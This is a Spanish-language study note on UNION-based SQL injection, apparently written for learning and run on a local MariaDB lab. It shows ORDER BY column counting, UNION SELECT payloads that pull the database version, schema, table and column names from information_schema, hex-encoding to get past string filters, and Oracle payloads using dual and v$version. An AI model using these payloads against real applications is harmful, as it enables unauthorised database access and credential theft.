- Tags : #sql #sqlinjection #shep_sheet

Para esto es necesario identificar las BD que estamos atacado y utilizaremos el shep sheet de burpsuit

https://portswigger.net/web-security/sql-injection/cheat-sheet


Con la consulta concatenando un order by dependiendo de cual sea la BS [Oracle, MySql,Postgres] podemos determinar la cantidad de campos que devuelve una consulta 
Ejemplo Para saber la cantidad de campos que salen, 
Esto en la web se vera como que dará un error cuando no coincidan los campos pero al coincidir devolverá la consulta normalmente. El ejemplo es en consola en la web no se necesita ;
```sql

SELECT username,password FROM users WHERE id = '1' order by 5';-- -;
ERROR 1054 (42S22): Unknown column '5' in 'ORDER BY'

MariaDB [login]> SELECT username,password FROM users order by 3';-- -;;
ERROR 1054 (42S22): Unknown column '3' in 'ORDER BY'

MariaDB [login]> SELECT username,password FROM users order by 2';-- -;;
+---------------+------------------+
| username      | password         |
+---------------+------------------+
| administrator | administrator123 |
| gest          | gest123          |
| savitar       | savitar123       |
+---------------+------------------+

```

Para la extracción de datos podemos concatenar valores que coincidan con la cantidad de campos que salen en la consulta previamente determinado con el order by 
```sql
ariaDB [login]> SELECT username,password FROM users union select 1,2 ;
+---------------+------------------+
| username      | password         |
+---------------+------------------+
| savitar       | savitar123       |
| administrator | administrator123 |
| gest          | gest123          |
| 1             | 2                |
+---------------+------------------+

Podemos extraer informacion 
MariaDB [login]> SELECT username,password FROM users union select 1,@@version ;
+---------------+---------------------------------+
| username      | password                        |
+---------------+---------------------------------+
| savitar       | savitar123                      |
| administrator | administrator123                |
| gest          | gest123                         |
| 1             | 11.8.3-MariaDB-1+b1 from Debian |
+---------------+---------------------------------+

Otros informaciones que podemos extraer
@@version,database(),user(), 

Podemos revisar la estructura 
schema_name from information_schema.schemata
group_concat(schema_name) Concatena toda la salida en un solo campo

SELECT username,password FROM users union select 2,group_concat(schema_name) from information_schema.schemata ;
+---------------+-------------------------------------------------------+
| username      | password                                              |
+---------------+-------------------------------------------------------+
| savitar       | savitar123                                            |
| administrator | administrator123                                      |
| gest          | gest123                                               |
| 2             | information_schema,sys,mysql,login,performance_schema |
+---------------+-------------------------------------------------------+

Sabiendo los nombres de las BD podemos revisar el conenido de estas  con un filrado 

 SELECT username,password FROM users union select 2,group_concat(table_name) from information_schema.tables where table_schema='login' ;
+---------------+------------------+
| username      | password         |
+---------------+------------------+
| savitar       | savitar123       |
| administrator | administrator123 |
| gest          | gest123          |
| 2             | users            |
+---------------+------------------+
4 rows in set (0.002 sec)

Para ver las columnas de una tabla
	
SELECT username,password FROM users union select 2,group_concat(column_name) from information_schema.columns where table_schema='login' and table_name='users' ;
+---------------+----------------------+
| username      | password             |
+---------------+----------------------+
| savitar       | savitar123           |
| administrator | administrator123     |
| gest          | gest123              |
| 2             | id,username,password |
+---------------+----------------------+

Para enumerar las tablas
Esta enumera todas las tablas de todas las BD 
SELECT username,password FROM users union select NULL,table_name from information_schema.tables;

Para la que nos interesa

SELECT username,password FROM users union select NULL,table_name from information_schema.tables where table_schema='login';

Tips si en ocaciones no deja pasar parametros como cadena lo podemos pasar como hexadecimal 

echo -n "valor a cambir" | xxd -p
76616c6f7220612063616d626972
y el valor de salida lo ponemos en el navegador agregandole 0x.  0x76616c6f7220612063616d626972
```

Para BD de Oracle al hacer un union  siempre hay que reverenciar una tabla al hacer este tipo de consultas una de las mas comunes es la tabla dual . Por lo que en el navegador se vería algo así

```
union select 'a','b' from dual --

Para extraer la version seria como nos indican en la shep sheet de Burpsuit
union select 'a',banner from v$version --

```
